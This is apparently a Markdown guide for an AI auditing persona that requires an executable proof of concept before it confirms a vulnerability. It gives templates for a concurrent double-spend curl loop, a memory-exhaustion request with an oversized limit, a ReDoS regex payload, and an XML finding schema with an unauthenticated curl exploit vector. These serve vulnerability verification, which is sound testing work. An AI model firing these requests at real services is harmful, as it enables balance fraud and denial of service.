# PoC Falsification & Exploit Synthesis Patterns

OMNI-MAXIMUS enforces the **Zero-False-Positive Guarantee**. No vulnerability or stability defect is confirmed without synthesizing an executable Proof-of-Concept (PoC).

---

## 1. Concurrency Double-Spend PoC Template

Used to falsify **SEV-2 (Concurrency & Race Conditions)** on balance updates, credit redemption, or coupon usage.

```bash
#!/usr/bin/env bash
# PoC: Trigger 10 concurrent redemption requests on single balance
TARGET_URL="https://api.example.com/v1/credits/redeem"
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

echo "Initiating 10 simultaneous redemption requests..."
for i in {1..10}; do
  curl -s -X POST "$TARGET_URL" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount": 50, "reference": "RACE-TEST"}' &
done
wait
echo "All concurrent requests completed. Inspecting final balance..."
```

- **Falsification Verdict:** If multiple requests succeed and the balance drops below zero, **CONFIRMED (P0)**. If only one succeeds and the other 9 return `409 Conflict` or `422 Insufficient Funds`, **MITIGATED / FALSE POSITIVE**.

---

## 2. Unbounded Query Memory Exhaustion PoC

Used to falsify **SEV-5 (Unbounded Database Queries)** and **SEV-6 (Memory Bloat)**.

```bash
# PoC: Request large catalog without pagination limit
curl -s -w "\nTime: %{time_total}s | Size: %{size_download} bytes\n" \
  "https://api.example.com/v1/products?limit=999999&include=meta,variants,reviews"
```

- **Falsification Verdict:** If the request returns $> 10\text{ MB}$ in a single JSON payload or causes the node process memory to spike $> 150\text{ MB}$, **CONFIRMED (P1)**. If server clamps request to `max_limit = 50`, **FALSE POSITIVE**.

---

## 3. ReDoS Regex Catastrophic Backtracking PoC

Used to falsify **SEV-1 / Gate 0 (Artisanal Regex Denial of Service)**.

```javascript
// PoC: Benchmark regex against pathological input string
const regex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
const evilPayload = "a".repeat(30) + "@" + "a".repeat(30) + "!";

const t0 = performance.now();
regex.test(evilPayload);
const durationMs = performance.now() - t0;

console.log(`Execution took ${durationMs} ms`);
// If durationMs > 500ms, CONFIRMED ReDoS vulnerability (P1).
```

---

## 4. The `<falsation_audit>` Output Schema

Every audit output MUST wrap each candidate finding in this verifiable block:

```xml
<falsation_audit>
  <finding_id>SEC-001</finding_id>
  <taint_check>
    Input reaches sink at src/api/orders.ts:88 without authorization middleware.
  </taint_check>
  <exploit_vector>
    curl -X POST https://api.example.com/orders/cancel -d '{"order_id": 999}'
  </exploit_vector>
  <runtime_guards>
    No capability check detected in handler; direct SQL execute.
  </runtime_guards>
  <verdict>CONFIRMED_VULNERABILITY</verdict>
</falsation_audit>
```
